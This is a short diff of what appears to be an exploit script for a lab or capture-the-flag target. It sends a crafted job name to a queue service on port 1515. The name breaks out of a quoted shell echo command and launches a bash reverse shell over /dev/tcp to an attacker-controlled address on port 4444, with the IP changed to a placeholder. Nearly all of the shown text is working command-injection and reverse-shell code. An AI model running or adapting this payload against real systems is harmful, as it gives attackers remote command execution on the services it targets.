@@ -8,7 +8,7 @@ PORT = 1515
 QUEUE = "archive_intake"
 
 # Your Kali tun0 VPN address
-LHOST = "10.10.14.38"
+LHOST = "XX.XX.XXX.XX"  #changeme
 LPORT = 8000
 
 
@@ -25,10 +25,10 @@ def recv_ack(sock: socket.socket, stage: str) -> None:
 
 # Break out of the single-quoted echo command, execute curl,
 # then comment out the remainder of the original command.
-# Replace previous job name from test script
+# Replace previous job name with revshell
 job_name = (
     "proof'; "
-    "bash -c 'bash -i >& /dev/tcp/10.10.14.38/4444 0>&1'; "
+    "bash -c 'bash -i >& /dev/tcp/XX.XX.XXX.XX/4444 0>&1'; " #changeme
     "#"
 )
 
